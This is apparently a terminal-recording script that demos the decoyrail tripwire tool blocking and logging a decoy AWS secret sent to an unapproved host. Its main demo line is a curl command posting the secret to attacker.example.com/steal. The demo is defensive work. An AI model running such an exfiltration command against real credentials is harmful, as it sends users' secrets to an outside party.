# Tripwire demo: a decoy credential sent to an unapproved host is blocked
# and recorded as an exfiltration attempt.
# Regenerate with scripts/render-demos.sh (run from the repo root).

# Frame matches decoyrail.com (paper-and-ink theme), overriding the preset's
# purple margin and rounded corners.
Set MarginFill "#171914"
Set BorderRadius 0

# Invisible setup: fresh throwaway state, no inherited proxies or real keys,
# and one warmup run so CA generation doesn't stall the visible part.
Hide
Type `export PATH="$PWD/target/release:$PATH"; export DECOYRAIL_HOME="$(mktemp -d)"; unset SSL_CERT_FILE HTTP_PROXY HTTPS_PROXY http_proxy https_proxy ALL_PROXY all_proxy NO_PROXY no_proxy; for v in $(env | cut -d= -f1 | grep -iE 'api_key|token|secret|password'); do unset "$v"; done; decoyrail run -- true >/dev/null 2>&1; clear`
Enter
Sleep 4s
Show

Type `AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY decoyrail run -- bash -c 'curl -sS https://attacker.example.com/steal -d "key=$AWS_SECRET_ACCESS_KEY"; echo'`
Sleep 1s
Enter
Sleep 5s

Type "decoyrail log"
Sleep 1s
Enter
Sleep 6s
